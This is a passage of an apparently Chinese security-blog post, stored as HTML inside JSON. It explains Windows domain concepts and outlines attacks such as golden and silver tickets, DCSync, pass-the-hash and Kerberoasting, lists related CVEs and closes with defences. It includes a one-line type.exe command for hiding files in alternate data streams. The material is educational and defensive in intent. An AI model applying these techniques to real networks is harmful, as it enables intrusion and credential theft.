程序</li>\n</ul>\n</li>\n<li>\n<p>netsh.exe</p>\n</li>\n<li>\n<p>installutil.exe</p>\n<ul>\n<li>安装 / 卸载程序组件</li>\n</ul>\n</li>\n<li>\n<p>IEExec.exe</p>\n<ul>\n<li>.NET Framework 附带程序</li>\n</ul>\n</li>\n<li>\n<p>powershell.exe</p>\n</li>\n<li>\n<p>psexec.exe</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc2V4ZWM=\">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</span></li>\n</ul>\n</li>\n<li>\n<p>reg.exe</p>\n<ul>\n<li>注册表控制台</li>\n</ul>\n</li>\n<li>\n<p>regedit.exe</p>\n<ul>\n<li>注册表修改</li>\n</ul>\n</li>\n<li>\n<p>regsvr32.exe</p>\n<ul>\n<li>注册动态链接库 / ActiveX 控件</li>\n</ul>\n</li>\n<li>\n<p>rundll32.exe</p>\n<ul>\n<li>执行 DLL 文件中的内部函数</li>\n</ul>\n</li>\n<li>\n<p>sc.exe</p>\n<ul>\n<li>查看服务状态管理</li>\n</ul>\n</li>\n<li>\n<p>schtasks.exe</p>\n<ul>\n<li>定时计划任务</li>\n</ul>\n</li>\n<li>\n<p>shred</p>\n<ul>\n<li>重复写入文件，防止文件恢复</li>\n</ul>\n</li>\n<li>\n<p>type.exe</p>\n<ul>\n<li>利用 ads 隐藏文件  <code>type &lt;filepath&gt; &lt;target_file:ads&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>wmic.exe</p>\n<ul>\n<li>Windows 管理工具</li>\n</ul>\n</li>\n<li>\n<p>windbg.exe</p>\n</li>\n<li>\n<p>winrm.exe</p>\n</li>\n<li>\n<p>wscript.exe</p>\n<ul>\n<li>脚本引擎</li>\n</ul>\n</li>\n<li>\n<p>waitfor.exe</p>\n<ul>\n<li>用于同步网络中计算机，可以发送或等待系统上的信号。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"msprc\"><a class=\"anchor\" href=\"#msprc\">#</a> MSPRC</h1>\n<p>MSRPC (Microsoft Remote Procedure Call) 是微软对 DCE/RPC 协议的修改实现，用于支持 Windows 系统中应用程序的远程网络调用。</p>\n<p>MSRPC 所使用的端口有 UDP 135 和 TCP 139 / 445 。</p>\n<p>MSRPC 可以用于</p>\n<ul>\n<li>用户遍历</li>\n<li>服务遍历</li>\n<li>凭证导出</li>\n<li>横向移动</li>\n<li>权限提升</li>\n</ul>\n<h1 id=\"域渗透\"><a class=\"anchor\" href=\"#域渗透\">#</a> 域渗透</h1>\n<h2 id=\"用户\"><a class=\"anchor\" href=\"#用户\">#</a> 用户</h2>\n<h3 id=\"用户组与工作组\"><a class=\"anchor\" href=\"#用户组与工作组\">#</a> 用户组与工作组</h3>\n<h4 id=\"用户-2\"><a class=\"anchor\" href=\"#用户-2\">#</a> 用户</h4>\n<p>Windows 系统存在一些为了特定用途而设置的用户，分别是：SYSTEM (系统)、Trustedinstaller (信任程序模块)、Everyone (所有人)、Creator Owner (创建者) 等，这些特殊用户不属于任何用户组，是完全独立的账户。其中 SYSTEM 拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p>\n<h4 id=\"用户组\"><a class=\"anchor\" href=\"#用户组\">#</a> 用户组</h4>\n<p>Windows 系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p>\n<p>默认情况下，系统为用户分了 7 个组，并给每个组赋予不同的操作权限。这些组为：管理员组 (Administrators)、高权限用户组 (Power Users)、普通用户组 (Users)、备份操作组 (Backup Operators)、文件复制组 (Replicator)、来宾用户组 (Guests)、身份验证用户组 (Authenticated Users)。</p>\n<h4 id=\"工作组\"><a class=\"anchor\" href=\"#工作组\">#</a> 工作组</h4>\n<p>工作组（Workgroup）是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为 workgroup 的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p>\n<h3 id=\"域中用户\"><a class=\"anchor\" href=\"#域中用户\">#</a> 域中用户</h3>\n<h4 id=\"域用户\"><a class=\"anchor\" href=\"#域用户\">#</a> 域用户</h4>\n<p>域环境中的用户和本地用户的帐户不同，域用户帐户保存在活动目录中。在域环境中，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用 SID (Security Identifier) 来表明身份，用 NTLM 哈希或者 Kerberos 来验证身份。</p>\n<h4 id=\"机器用户\"><a class=\"anchor\" href=\"#机器用户\">#</a> 机器用户</h4>\n<p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以  <code>$</code>  结尾。</p>\n<h3 id=\"组策略\"><a class=\"anchor\" href=\"#组策略\">#</a> 组策略</h3>\n<p>组策略 (Group Policy) 用于控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略 (LGPO 或 LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作 GPO (Group Policy Object)。</p>\n<h2 id=\"内网常用协议\"><a class=\"anchor\" href=\"#内网常用协议\">#</a> 内网常用协议</h2>\n<p>Windows 查询名称解析的顺序为 DNS、mDNS、LLMNR、NBNS。</p>\n<h3 id=\"netbios\"><a class=\"anchor\" href=\"#netbios\">#</a> NetBIOS</h3>\n<p>NetBIOS（Network Basic Input/Output System）是基于网络的交互协议，通常使用 UDP 137、UDP 138、TCP 139 等端口。Windows 在安装 TCP/IP 协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p>\n<p>基于 NetBIOS 有 NBNS (NetBIOS Name Service) 服务，通常监听在 UDP 137 端口，该服务提供三种功能：将 NetBIOS 名称解析到 IP、查询某一个 NetBIOS 节点的状态，注册 / 释放一个 NetBIOS 名。</p>\n<p>可以使用  <code>nbtstat</code>  工具利用 NetBIOS 协议管理网络。</p>\n<h3 id=\"llmnr\"><a class=\"anchor\" href=\"#llmnr\">#</a> LLMNR</h3>\n<p>链路本地多播名称解析 (Link-Local Multicast Name Resolution, LLMNR) 是一个基于 DNS 数据包格式的协议，IPv4 和 IPv6 的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在 Windows Vista 后被引入。 LLMNR 监听 UDP 5355 端口，可以通过多播地址 224.0.0.252 (或  <code>FF02:0:0:0:0:0:1:3</code> ) 访问。</p>\n<h3 id=\"mdns\"><a class=\"anchor\" href=\"#mdns\">#</a> mDNS</h3>\n<p>mDNS (multicast DNS) 在 Windows 10 中被引入，监听 UDP 5353 端口，对应的多播地址为 224.0.0.251 (  <code>FF02::FB</code>  ) 。mDNS 主要实现了在没有传统 DNS 服务器的情况下使局域网内的主机实现相互发现和通信。</p>\n<h3 id=\"wpad\"><a class=\"anchor\" href=\"#wpad\">#</a> WPAD</h3>\n<p>网络代理自动发现协议 (Web Proxy Auto-Discovery, WPAD) 是一种客户端使用 DHCP 和 / 或 DNS 发现方法来定位一个配置文件 URL 的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定 URL 应使用的代理。</p>\n<h2 id=\"域\"><a class=\"anchor\" href=\"#域\">#</a> 域</h2>\n<h3 id=\"域结构\"><a class=\"anchor\" href=\"#域结构\">#</a> 域结构</h3>\n<h4 id=\"域树\"><a class=\"anchor\" href=\"#域树\">#</a> 域树</h4>\n<p>域树（Trees）由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间（namespace）。</p>\n<h4 id=\"林\"><a class=\"anchor\" href=\"#林\">#</a> 林</h4>\n<p>林（Forests）是一个复杂的 AD 实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p>\n<h3 id=\"域控制器\"><a class=\"anchor\" href=\"#域控制器\">#</a> 域控制器</h3>\n<p>ADDS 的目录存储在域控制器 (Domain Controller) 内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同的数据库。</p>\n<p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p>\n<p>AD 数据库有多主机复制模式（Multi-master Replication Model）和单主机复制模式（Sing-master Replication Model）。</p>\n<p>多主机模式可以直接更新任何一台域控制器内的 AD 对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p>\n<p>单主机复制模式是指由一台被称作操作主机（Operations Master）的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p>\n<h3 id=\"信任\"><a class=\"anchor\" href=\"#信任\">#</a> 信任</h3>\n<p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p>\n<h4 id=\"域信任类型\"><a class=\"anchor\" href=\"#域信任类型\">#</a> 域信任类型</h4>\n<p>Active Directory 的信任方式可以分为以下几种：</p>\n<ul>\n<li>Tree-Root Trust\n<ul>\n<li>双向具有转移性</li>\n</ul>\n</li>\n<li>Parent-Child Trust\n<ul>\n<li>具有转移性，双向行人</li>\n</ul>\n</li>\n<li>Forest Trust\n<ul>\n<li>如果两个林创建了信任关系，则林中所有的域都相互信任</li>\n<li>两个林之间的信任关系无法自动扩展到其他林上</li>\n</ul>\n</li>\n<li>Realm Trust\n<ul>\n<li>ADDS 域可以和非 Windows 系统的 Kerberos 域之间创建信任</li>\n</ul>\n</li>\n<li>External Trust\n<ul>\n<li>位于两个林内的域之间可以通过外部信任来创建信任关系</li>\n</ul>\n</li>\n<li>Shortcut Trust\n<ul>\n<li>可以缩短验证用户身份的时间</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"ou\"><a class=\"anchor\" href=\"#ou\">#</a> OU</h3>\n<p>组织单位（Organization Unit，OU）是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU 包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p>\n<h2 id=\"active-directory\"><a class=\"anchor\" href=\"#active-directory\">#</a> Active Directory</h2>\n<p>活动目录 (Active Directory，AD) 是面向 Windows Server 的目录服务。Active Directory 存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p>\n<h3 id=\"adds\"><a class=\"anchor\" href=\"#adds\">#</a> ADDS</h3>\n<p>Active Directory 提供目录服务的组件被称作 Active Directory 域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p>\n<p>从逻辑上看，ADDS 的组件可以分为 Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p>\n<p>Partition 也被称为 naming context，是 AD DS 数据库的一部分。Schema 是存储在 ADDS 中数据的定义。Container 是为 ADDS 提供组织框架的对象。</p>\n<p>从实现上区分，ADDS 可以分为 Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p>\n<p>每个域控制器都有完整的 ADDS 数据，每个域控都可以处理数据的修改并同步至其他的域控。</p>\n<p>域控会有一份数据拷贝 (Data store) ，默认存储在  <code>C:\\Windows\\NTDS</code>  目录下。</p>\n<p>Global catalog server 是存储全局 catalog 的域控，catlog 以只读的方式存储了一个 multiple-domain forest 的所有对象，用于加速搜索。</p>\n<h3 id=\"名称空间\"><a class=\"anchor\" href=\"#名称空间\">#</a> 名称空间</h3>\n<p>名称空间 (namespace) 是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p>\n<h3 id=\"对象与属性\"><a class=\"anchor\" href=\"#对象与属性\">#</a> 对象与属性</h3>\n<p>ADDS 内的资源都是以对象 (Object) 的形式存在的，对象通过属性 (Attrbute) 来描述其特征。</p>\n<h2 id=\"adcs\"><a class=\"anchor\" href=\"#adcs\">#</a> ADCS</h2>\n<h3 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h3>\n<p>Active Directory 证书服务 (Active Directory Certificate Services，AD CS) 是微软用于实现 PKI 的服务。</p>\n<h3 id=\"证书\"><a class=\"anchor\" href=\"#证书\">#</a> 证书</h3>\n<p>ADCS 中的证书是 X.509 格式的数字签名文档，用于加密、签名或身份验证等。</p>\n<p>证书常用的属性由下述字段组成</p>\n<ul>\n<li>Subject：主题</li>\n<li>Public Key：公钥</li>\n<li>Extended Key Usages (EKUs)：扩展密钥，描述证书的对象标识符 (Object identifier, OID)</li>\n<li>...</li>\n</ul>\n<p>常用的 EKU OID 包括：</p>\n<ul>\n<li>代码签名\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.3</li>\n<li>证书用于签署可执行代码</li>\n</ul>\n</li>\n<li>加密文件系统\n<ul>\n<li>OID 1.3.6.1.4.1.311.10.3.4</li>\n<li>证书用于加密文件系统</li>\n</ul>\n</li>\n<li>安全电子邮件\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.4</li>\n<li>证书用于加密电子邮件</li>\n</ul>\n</li>\n<li>客户端身份验证\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.2</li>\n</ul>\n</li>\n<li>智能卡登录\n<ul>\n<li>OID 1.3.6.1.4.1.311.20.2.2</li>\n</ul>\n</li>\n<li>服务器认证\n<ul>\n<li>OID 1.3.6.1.5.5.7.3.1</li>\n<li>证书用于识别服务器 (例如 HTTPS 证书)</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"证书模板\"><a class=\"anchor\" href=\"#证书模板\">#</a> 证书模板</h4>\n<p>微软提供了证书模板的功能，方便在域内签发证书。证书模板是注册策略和预定义证书设置的集合，包含证书有效期、用途、申请者等信息。</p>\n<h4 id=\"证书注册\"><a class=\"anchor\" href=\"#证书注册\">#</a> 证书注册</h4>\n<p>证书可以通过以下几种方式注册：</p>\n<ul>\n<li>通过 Windows 客户端证书注册协议 (MS-WCCE)</li>\n<li>通过 ICertPassage 远程协议 (MS-ICPR)</li>\n<li>在 ADCS 开启了对应 Web 服务的情况下，使用 Web 服务注册</li>\n<li>在服务器安装了对应服务时，通过证书注册服务 (CES) 注册</li>\n<li>在服务器安装了对应服务时，使用网络设备注册服务</li>\n</ul>\n<h2 id=\"组策略-2\"><a class=\"anchor\" href=\"#组策略-2\">#</a> 组策略</h2>\n<h3 id=\"简介-3\"><a class=\"anchor\" href=\"#简介-3\">#</a> 简介</h3>\n<p>组策略 (Group Policy, GP) 用于管理网络环境中的用户和设备，定义了系统管理员管理工作所要的各种模板组件。</p>\n<p>组策略有以下功能：</p>\n<ul>\n<li>管理注册表</li>\n<li>设置脚本</li>\n<li>重定向文件夹</li>\n<li>管理应用程序</li>\n<li>指定安全选项</li>\n</ul>\n<h3 id=\"常用概念\"><a class=\"anchor\" href=\"#常用概念\">#</a> 常用概念</h3>\n<p>组策略容器 (Group Policy Container，GPC) 存储在活动目录中，包含 GPO 属性、配置信息和版本等。可以通过 GPC 来查找 GPT。</p>\n<p>组策略模板 (Group Policy Template, GPT) 存储在域控中，包含所有的组策略信息。包括管理模板，安全，脚本，软件安装等。</p>\n<p>其中 GPC 中的信息量少、容量小，GPT 中消息量较大、容量大，因此两个部分分开存放。防止活动目录中因存储了过多的数据而被影响性能。</p>\n<p>组策略对象 (Group Policy Object, GPO) 是包含多种 Windows 组策略设置的集合，存储在 GPC 和 GPT 中。</p>\n<h2 id=\"域内攻击思路\"><a class=\"anchor\" href=\"#域内攻击思路\">#</a> 域内攻击思路</h2>\n<ul>\n<li>获取域控权限\n<ul>\n<li>通过域控相关漏洞</li>\n<li>抓 hash，尤其是域管理员、运维等高权限账号的哈希</li>\n</ul>\n</li>\n<li>控制入域机器\n<ul>\n<li>下发恶意策略控制</li>\n<li>获取域内用户凭证</li>\n<li>利用错误的域管理配置</li>\n<li>域内 relay</li>\n</ul>\n</li>\n<li>获取服务票据\n<ul>\n<li>攻击 Exchange 等服务器</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"攻击类型\"><a class=\"anchor\" href=\"#攻击类型\">#</a> 攻击类型</h2>\n<h3 id=\"黄金票据利用\"><a class=\"anchor\" href=\"#黄金票据利用\">#</a> 黄金票据利用</h3>\n<p>在认证过程中，经过 client 与 AS 的通信会得到 TGT，黄金票据（Golden Ticket）就是伪造票据授予票据（TGT），也被称为认证票据。</p>\n<p>黄金票据利用需要与 DC 通信，且需要获取 krbtgt 的 hash，但是可以获取任何 Kerbose 服务权限。</p>\n<h3 id=\"白银票据利用\"><a class=\"anchor\" href=\"#白银票据利用\">#</a> 白银票据利用</h3>\n<p>白银票据（Silver Tickets）伪造利用的是 Kerberos 认证中的第三个步骤，在第三步的时候，client 会带着 ticket 向 server 的某个服务进行请求，如果验证通过就可以访问 server 上的指定服务了，这里的 ticket 是基于 client info、server session key、end time、server hash。这里 client info 已知，end time 可以构造，server session key 是 TGS 生成的，所以只要 server 的 NTLM hash 即可。银票伪造的是 TGS，只能访问指定的服务。</p>\n<h3 id=\"dcsync攻击\"><a class=\"anchor\" href=\"#dcsync攻击\">#</a> DCSync 攻击</h3>\n<p>域内有多台域控服务器时，为了同步域控服务器的修改，微软提供了基于远程目录协议 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvb3BlbnNwZWNzL3dpbmRvd3NfcHJvdG9jb2xzL21zLWRyc3IvZjk3N2ZhYWEtNjczZS00ZjY2LWI5YmYtNDhjNjQwMjQxZDQ3\">DRSR</span> 的同步机制。</p>\n<p>在多个域控服务器之间，每隔一段时间会有一次域数据的同步。由需要同步的域控服务器向其它服务器发送 GetNCChanges 请求，请求中包含需要同步的数据。数据量较多时，则重复这个过程。</p>\n<p>DCSync 就是使用这种机制进行域渗透的技术，由 Benjamin DELPY gentilkiwi 和 Vincent LE TOUX 共同编写，在 2015 年添加到 mimikatz 的一个功能，可以导出域内所有用户的 hash。</p>\n<p>这种方式需要满足以下任一一种权限：</p>\n<ul>\n<li>Administrators 组内的用户</li>\n<li>Domain Admins 组内的用户</li>\n<li>Enterprise Admins 组内的用户</li>\n<li>域控制器的计算机帐户</li>\n</ul>\n<p>或者拥有特定的几条 DACL:</p>\n<ul>\n<li>DS-Replication-Get-Changes</li>\n<li>DS-Replication-Get-Changes-All</li>\n<li>DS-Replication-Get-Changes-In-Filtered-Set</li>\n</ul>\n<p>当没有管理员用户，但是拥有 WriteDACL 权限时，可以写入上述 DACL 来完成 DCSync 。</p>\n<p>对于这种攻击，可以通过检测 GetNCChanges 发起者的方式，如果由非域控机器发起对应请求，则可以认为是 DCSync 攻击。</p>\n<h3 id=\"dcshadow攻击\"><a class=\"anchor\" href=\"#dcshadow攻击\">#</a> DCShadow 攻击</h3>\n<p>DCShadow 是由来自法国的安全研究人员 Benjamin Delpy 和 Vincent Le Toux 在 2018 年的微软蓝帽（Blue Hat）大会上提出。</p>\n<p>DCShadow 攻击指在 Active Directory 环境下创建一个恶意的域控制器，并用它来推送恶意对象。</p>\n<h3 id=\"哈希传递攻击\"><a class=\"anchor\" href=\"#哈希传递攻击\">#</a> 哈希传递攻击</h3>\n<p>哈希传递攻击（Pass-the-Hash，PTH）是通过传递 NTLM 哈希来认证的攻击方法，常用的工具有 mimikatz 等。</p>\n<h3 id=\"票据传递攻击\"><a class=\"anchor\" href=\"#票据传递攻击\">#</a> 票据传递攻击</h3>\n<p>票据传递攻击（Pass-the-Ticket Attacks，PtT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。PtT 最常见的用途可能是使用黄金票据和白银票据，通过 PtT 访问主机相当简单。</p>\n<h3 id=\"kerberoasting-attacks\"><a class=\"anchor\" href=\"#kerberoasting-attacks\">#</a> Kerberoasting Attacks</h3>\n<p>Kerberoasting 攻击由 Tim Medin 在 2014 DerbyCon conference 上 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1QVXlobE4tRTVNVQ==\">公开</span> 。指域内的任何一台主机，都可以通过查询 SPN，Kerberoasting 即是向域内的所有服务请求 TGS，然后进行暴力破解。</p>\n<h4 id=\"roasting-as-rep\"><a class=\"anchor\" href=\"#roasting-as-rep\">#</a> Roasting AS-REP</h4>\n<p>该攻击枚举域中不需要 Kerberos 预身份认证的帐户，向这些账户请求一条加密信息，并离线尝试获取到的账户哈希。该方式需要账户明确设置了  <code>DONT_REQ_PREAUTH</code>  。</p>\n<h3 id=\"kerberos-delegation-attacks\"><a class=\"anchor\" href=\"#kerberos-delegation-attacks\">#</a> Kerberos Delegation Attacks</h3>\n<p>在一个域中，A 使用 Kerberos 身份验证访问服务 B，B 再使用 A 的身份去访问 C，这个过程就可以理解为委派。委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两种，非约束委派可以访问域内任意其它服务，约束委派对认证做了限制不可以访问其他的服务。</p>\n<p>Kerberos Delegation（Kerberos 委派）攻击分为非约束委派攻击和约束委派攻击。原理都是基于域内已经配置了委派的账户来获取其它账户的权限。</p>\n<h3 id=\"其他漏洞利用\"><a class=\"anchor\" href=\"#其他漏洞利用\">#</a> 其他漏洞利用</h3>\n<ul>\n<li>域用户提权 (CVE-2022-26923)</li>\n<li>KDC bamboozling (CVE-2021-42287)</li>\n<li>Name impersonation (CVE-2021-42278)</li>\n<li>ProxyShell (CVE-2021-34473)</li>\n<li>ProxyLogon (CVE-2021-26855)</li>\n<li>PrintNightmare (CVE-2021-1675 / CVE-2021-34527)</li>\n<li>SMBGhost (CVE-2020-0796)</li>\n<li>Zerologon (CVE-2020-1472)</li>\n<li>NTLM Relay (CVE-2019-1040)</li>\n<li>永恒之蓝 (MS17-010)</li>\n<li>域用户提权 (MS14-068)</li>\n<li>Gpp 漏洞 (MS14-025)</li>\n<li>SAMR 协议漏洞 (MS14-016)</li>\n</ul>\n<h2 id=\"防护\"><a class=\"anchor\" href=\"#防护\">#</a> 防护</h2>\n<ul>\n<li>使用 ATA 等商业化防护工具</li>\n<li>安装杀毒软件、EDR 等工具</li>\n<li>关闭高危服务</li>\n<li>统一配置防火墙策略</li>\n<li>对域控等高危账号使用白名单进行行为管理</li>\n<li>检测高危操作\n<ul>\n<li>权限提升</li>\n<li>高危账号密码修改、重置</li>\n</ul>\n</li>\n<li>行为频率建模\n<ul>\n<li>对大量尝试登录 / 信息查询进行报警</li>\n</ul>\n</li>\n<li>及时安装补丁</li>\n<li>对特定攻击行为进行监控\n<ul>\n<li>通过 GPO 下发自启动、计划任务</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "Windows",
                "渗透",
                "信息收集",
                "痕迹清理"
            ]
        }
    ]
}